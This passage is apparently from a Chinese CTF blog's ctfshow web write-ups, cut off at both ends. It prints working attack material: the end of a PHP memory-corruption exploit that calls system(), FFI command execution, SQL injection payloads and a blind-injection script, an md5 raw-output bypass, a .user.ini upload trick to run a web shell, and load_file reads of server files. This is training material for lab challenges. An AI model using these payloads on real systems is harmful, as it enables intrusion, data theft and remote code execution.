class=\"token variable\">$fake_obj_offset</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">,</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$closure_obj</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"170\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"171\"></td><td><pre>    <span class=\"token comment\"># pwn</span></pre></td></tr><tr><td data-num=\"172\"></td><td><pre>    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$abc_addr</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$fake_obj_offset</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"173\"></td><td><pre>    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xd0</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\"># internal func type</span></pre></td></tr><tr><td data-num=\"174\"></td><td><pre>    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xd0</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$zif_system</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\"># internal func handler</span></pre></td></tr><tr><td data-num=\"175\"></td><td><pre>    <span class=\"token punctuation\">(</span><span class=\"token variable\">$helper</span><span class=\"token operator\">-></span><span class=\"token property\">b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"176\"></td><td><pre>    <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"177\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"178\"></td><td><pre><span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><h2 id=\"web-75\"><a class=\"anchor\" href=\"#web-75\">#</a> web 75</h2>\n<p>先通过 glob 读取文件目录</p>\n<p>用数据库 pdo 读取</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token variable\">$dbh</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span>  <span class=\"token class-name\">PDO</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'mysql : host=localhost ; dbname=ctftraining'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">' root'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">' root'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$dbh</span><span class=\"token operator\">-></span><span class=\"token function\">query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select- load_ file(\"/flag36.txt\") '</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span>  <span class=\"token variable\">$row</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"I\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token variable\">$dbh</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">PDOException</span> <span class=\"token variable\">$e</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$e</span><span class=\"token operator\">-></span><span class=\"token function\">getMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h2 id=\"web-77\"><a class=\"anchor\" href=\"#web-77\">#</a> web 77</h2>\n<p>盲测特性</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>c<span class=\"token operator\">=</span><span class=\"token variable\">$ffi</span> <span class=\"token operator\">=</span> FFl<span class=\"token punctuation\">:</span><span class=\"token function\">cdef</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"int system(const char *command);\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'/readflag> 1.txt'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>ff<span class=\"token operator\">-></span><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h2 id=\"web-118\"><a class=\"anchor\" href=\"#web-118\">#</a> web 118</h2>\n<p><code>$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;$IFS????.???</code></p>\n<p>nl 命令</p>\n<h2 id=\"web-119\"><a class=\"anchor\" href=\"#web-119\">#</a> web 119</h2>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.github.io/2022/10/04/CTF/ctfshow/Web_other/",
            "url": "http://dpm12345.github.io/2022/10/04/CTF/ctfshow/Web_other/",
            "title": "Web_other",
            "date_published": "2022-10-04T03:43:10.000Z",
            "content_html": "<h1 id=\"web-4\"><a class=\"anchor\" href=\"#web-4\">#</a> web 4</h1>\n<p>日志文件   蚁剑</p>\n<h1 id=\"web-5\"><a class=\"anchor\" href=\"#web-5\">#</a> web 5</h1>\n<p><strong>开头 0e 的 md5</strong></p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>QNKCDZO：0e830400451993494058024219903391 </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>240610708：0e462097431906509019562988736854 </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>s878926199a 0e545993274517709034328855841020 </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>s155964671a 0e342768416822451524974117254469 </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>s214587387a 0e848240448830537924465865611904 </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>s1091221200a 0e940624217856561557816327384675 </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>s1885207154a 0e509367213418206700842008763514 </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>s1502113478a 0e861580163291561247404381396064 </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>s1836677006a 0e481036490867661113260034900752 </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>s1184209335a 0e072485820392773389523109082030 </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>s1665632922a 0e731198061491163073197128363787 </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>s532378020a 0e220463095855511507588041205815</pre></td></tr></table></figure><h1 id=\"web-6\"><a class=\"anchor\" href=\"#web-6\">#</a> web 6</h1>\n<p>输入万能密码，显示 <code>sql injection error</code></p>\n<p>猜测空格过滤，绕过，发现能正常回显，之后便是正常爆库、表、字段了</p>\n<h1 id=\"web-7\"><a class=\"anchor\" href=\"#web-7\">#</a> web 7</h1>\n<p>同样的也是空格过滤</p>\n<p>在输入时同时也发现对单引号  <code>'</code>  的滤</p>\n<h1 id=\"web-8\"><a class=\"anchor\" href=\"#web-8\">#</a> web 8</h1>\n<p>首先确认该题为数字型注入 同样也是过滤了空格，之后可发现过滤了逗号，那么联合查询不能使用了，可以采用布尔盲注 下面是逗号的绕过方法</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>&#39; and ascii (substr ((select database ()),1,1))&#x3D;xx #</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>这样的话写个脚本很容易跑出来了，过滤逗号之后可以变成这样</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>&#39; and ascii (substr ((select database ()) from 1 for 1))&#x3D;xx #</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>这应该是 substring 函数的两种用法</pre></td></tr></table></figure><p>使用如下程序爆库</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>s <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>table <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">'http://41ca0d79-9b41-4a09-b5e6-a5d1fe2a3a03.challenge.ctf.show/index.php'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">50</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#估计查询到的字段长度</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">31</span><span class=\"token punctuation\">,</span> <span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#从可读取的 ascii 码开始到结束</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token comment\"># 爆表名</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        payload <span class=\"token operator\">=</span> <span class=\"token string\">\"ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%s/**/for/**/1))=%s#\"</span><span class=\"token operator\">%</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token comment\">#爆字段名 flag</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token comment\">#payload = \"ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1))=%s#\"%(str(i),str(j))</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token comment\">#读取 flag</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token comment\">#payload = \"ascii(substr((select/**/flag/**/from/**/flag)from/**/%s/**/for/**/1))=%s#\"%(str(i), str(j))</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        re <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url <span class=\"token operator\">+</span> <span class=\"token string\">'?id=0/**/or/**/'</span> <span class=\"token operator\">+</span> payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>text</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">'I asked nothing'</span> <span class=\"token keyword\">in</span> re<span class=\"token punctuation\">:</span>  <span class=\"token comment\">#是否成功   </span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            table <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>table<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr></table></figure><p>得到 flag</p>\n<h1 id=\"web-9\"><a class=\"anchor\" href=\"#web-9\">#</a> web 9</h1>\n<p>访问  <code>/robots.txt</code>  可以知道源码文件</p>\n<p>下载得到</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token variable\">$flag</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\t<span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"password error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t<span class=\"token variable\">$sql</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"select * from user where username ='admin' and password ='\"</span><span class=\"token operator\">.</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">,</span><span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"'\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token variable\">$result</span><span class=\"token operator\">=</span><span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$con</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">mysqli_num_rows</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t\t\t\t<span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token operator\">=</span><span class=\"token function\">mysqli_fetch_assoc</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t\t\t\t\t <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"登陆成功&lt;br>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t\t\t\t\t <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t\t\t\t <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><code>$sql=&quot;select * from user where username ='admin' and password ='&quot;.md5($password,true).&quot;'&quot;;</code></p>\n<p>其中</p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/%E5%9B%BE%E7%89%87/3544233-69332a9de6e8291b.png\" alt=\"\" /></p>\n<p>由此如果想要绕过，那么应该使得 <code>password</code>  转换成 16 进制的 hex 值以后，再将其转换成字符串后包含 <code>' 'or ' 6'&lt;trash&gt;</code></p>\n<p>有一个字符串为  <code>ffifdyop</code> , 经过上述操作满足该条件</p>\n<p>构成 <code>SELECT * FROM admin WHERE pass=' 'or ' 6'&lt;trash&gt;</code></p>\n<p>就可以注入了</p>\n<h1 id=\"web-10\"><a class=\"anchor\" href=\"#web-10\">#</a> web 10</h1>\n<p>这里介绍两个 mysql 语句</p>\n<ol>\n<li>\n<p>group by（将结果集中的数据行根据选择列的值进行逻辑分组） 不加 group by 时的输出如下</p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/%E5%9B%BE%E7%89%87/20200217171754632.png\" alt=\"\" /></p>\n<p>在使用 group by 以后会按照 password 中的值进行排列</p>\n</li>\n<li>\n<p>with rollup（group by 后可以跟 with rollup，表示在进行分组统计的基础上再次进行汇总统计） 来看实例</p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/%E5%9B%BE%E7%89%87/20200217171715827.png\" alt=\"\" /></p>\n<p>结果中将会多出一行，其中 <code>password</code>  列为 null， <code>count（*)</code>  为统计和。</p>\n</li>\n</ol>\n<p>这里我们就可以通过骚姿势绕过了。</p>\n<p>其中  <code>/**/</code>  是为了绕过空格过滤</p>\n<p><code>payload:username=admin'/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#&amp;password=</code></p>\n<p>因为加入 with rollup 后 password 有一行为 NULL，我们只要输入空密码使得 <code>(NULL==NULL)</code>  即可满足 <code>$password==$row['password']</code>  的限制成功登陆</p>\n<p>登录成功即可显示 flag</p>\n<h1 id=\"web-11\"><a class=\"anchor\" href=\"#web-11\">#</a> web 11</h1>\n<p>看代码</p>\n<p>要使 password=$_SESSION ['password']</p>\n<p>而 session 在 cookie 里，根据提示，那么删掉 cookie 后提交空密码即可</p>\n<h1 id=\"web-12\"><a class=\"anchor\" href=\"#web-12\">#</a> web 12</h1>\n<p>查看源码，有注释 <code>hit:?cmd=</code> ，题目 hint 为 glob 绕过</p>\n<p>查找相关函数后，payload： <code>?cmd=print_r(glob(&quot;*.php&quot;));</code>  或 <code>print_r(scandir(&quot;.&quot;));</code></p>\n<p>得到一个 php 文件名，再使用提示的 highlight 查看源码</p>\n<p>得到 flag</p>\n<h1 id=\"web-13\"><a class=\"anchor\" href=\"#web-13\">#</a> web 13</h1>\n<p>文件上传</p>\n<p>访问  <code>upload.php.bak </code> 下载源码</p>\n<p>知道做了很多限制，php 不能上传，文件内容不超过 24, 文件名小于 9，文件后缀不大于 3</p>\n<p>这里用到了上传 <code>.user.ini</code>  绕过黑名单</p>\n<p><strong>原理：</strong>  <code>PHP_INI_PREDIR</code>  模式的配置也可以在 <code>.user.ini</code>  文件中进行配置</p>\n<p>在 <code>PHP_INI_PERDIR</code>  模式中存在两个特殊的配置： <code>auto_append_file</code> 、 <code>auto_prepend_file</code> 。</p>\n<p><code>auto_prepend_file</code>  配置的作用为指定一个文件在主文件解析前解析， <code>auto_append_file</code>  的作用为指定一个文件在主文件解析后解析 因此可上传一个 <code>1.txt</code> ，内容为一句话木马 然后再上传包 <code>auto_prepend_file=1.txt</code>  的 <code>user.ini</code>  文件</p>\n<p>之后 payload： <code>http://14b1f783-83bc-4d8d-88dd-2c51ed6f4d05.challenge.ctf.show/?a=print_r(glob('*'));</code></p>\n<p>访问目录得到所有文件名，得到一个 php 文件名</p>\n<p>用 <code>highlight</code>  访问得到 flag</p>\n<h1 id=\"web-14\"><a class=\"anchor\" href=\"#web-14\">#</a> web 14</h1>\n<p>首先是一个 <code>switch</code>  语句</p>\n<p>观察代码，明显是要输出 url 的内容，那么必然要进入带有双引号的语句</p>\n<p>根据 <code>switch</code>  语句的特性，可以输入 <code>c=3</code> , 输出 url</p>\n<p>访问得到的路径，发现是一个数据库查询页面，回显为 <code>alert</code></p>\n<p>尝试 <code>1</code> ，返回 <code>admin，2</code> ，返回另一个，输入 <code>1 or 1=1</code> ，无反应，改为 <code>1/**/or/**/1=1</code> ，正常回显</p>\n<p>于是清楚注入方式和空格过滤</p>\n<p>查看源码也可知 <code>information_schema.tables</code>  和 <code>information_schema.columns</code>  被过滤 这里采用反引号过滤即 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>i</mi><mi>n</mi><mi>f</mi><mi>o</mi><mi>r</mi><mi>m</mi><mi>a</mi><mi>t</mi><mi>i</mi><mi>o</mi><msub><mi>n</mi><mi>s</mi></msub><mi>c</mi><mi>h</mi><mi>e</mi><mi>m</mi><mi>a</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">‘</mi><mi>t</mi><mi>a</mi><mi>b</mi><mi>l</mi><mi>e</mi><mi>s</mi><mi mathvariant=\"normal\">‘</mi></mrow><annotation encoding=\"application/x-tex\">information_schema.`tables`</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">o</span><span class=\"mord\"><span class=\"mord mathnormal\">n</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">s</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">a</span><span class=\"mord\">.</span><span class=\"mord\">‘</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">b</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">s</span><span class=\"mord\">‘</span></span></span></span></p>\n<p>之后爆出库名，表名，字段 最后查询字段值时，返回 <code>1adminflag is not here!,2gtf1ywow,you can really dance,3Wowtell you a secret,secret has a secret...</code></p>\n<p>也就是说 flag 可能在 <code>secret.php</code>  文件中 使用 MySQL 的 <code>load_file</code>  进行查询 访问默认目录 <code>/var/www/html/</code></p>\n<p><code>?query=0/**/union/**/select/**/load_file('/var/www/html/secret.php') </code></p>\n<p>查询后无回显，但查看源码，看到 alert 里面</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>&lt;?php</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>$url = 'here_1s_your_f1ag.php';</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>$file = '/tmp/gtf1y';</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>if(trim(@file_get_contents($file)) === 'ctf.show')&#123;</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\techo file_get_contents('/real_flag_is_here');</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>&#125;'</pre></td></tr></table></figure><p>也就是说 flag 可能在 <code>/real_flag_is_here</code>  里</p>\n<p>访问 <code>?query=0/**/union/**/select/**/load_file('/real_flag_is_here')</code></p>\n<p>无回显，但查看源码，同样在 alert 里，得到 flag</p>\n<h1 id=\"红包题第七弹\"><a class=\"anchor\" href=\"#红包题第七弹\">#</a> 红包题第七弹</h1>\n<p>页面显示 phpinfo () 的回显</p>\n<p>不知道咋做，网上搜索</p>\n<p>首先 wegt 下载 index，发现有后面文件，但无法访问</p>\n<p>shell 为 Letmein，使用蚁剑连接</p>\n<p>发现 flag.txt, 但点进去后没有内容，但 flag 是占用空间的</p>\n<p>那么回到网页，POST 传入 <code>Letmein=highlight_file ('/var/www/flag.txt');</code></p>\n<h1 id=\"ctfshow-web1\"><a class=\"anchor\" href=\"#ctfshow-web1\">#</a> CTFshow web1</h1>\n<p>爆破</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>url<span class=\"token operator\">=</span><span class=\"token string\">\"http://e9258400-1724-487b-b58e-e28eab62e8cc.challenge.ctf.show/\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>url1<span class=\"token operator\">=</span>url<span class=\"token operator\">+</span><span class=\"token string\">\"/reg.php\"</span> <span class=\"token comment\">#注册页面</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>url2<span class=\"token operator\">=</span>url<span class=\"token operator\">+</span><span class=\"token string\">\"/login.php\"</span><span class=\"token comment\">#登录界面</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>url3<span class=\"token operator\">=</span>url<span class=\"token operator\">+</span><span class=\"token string\">\"/user_main.php?order=pwd\"</span> <span class=\"token comment\">#查询界面</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>k<span class=\"token operator\">=</span><span class=\"token string\">\"ctfshow&#123;\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>s<span class=\"token operator\">=</span><span class=\"token string\">\"-.0123456789:abcdefghijklmnopqrstuvwxyz&#123;|&#125;~\"</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">45</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"*\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> s<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        l<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        l<span class=\"token operator\">=</span>k<span class=\"token 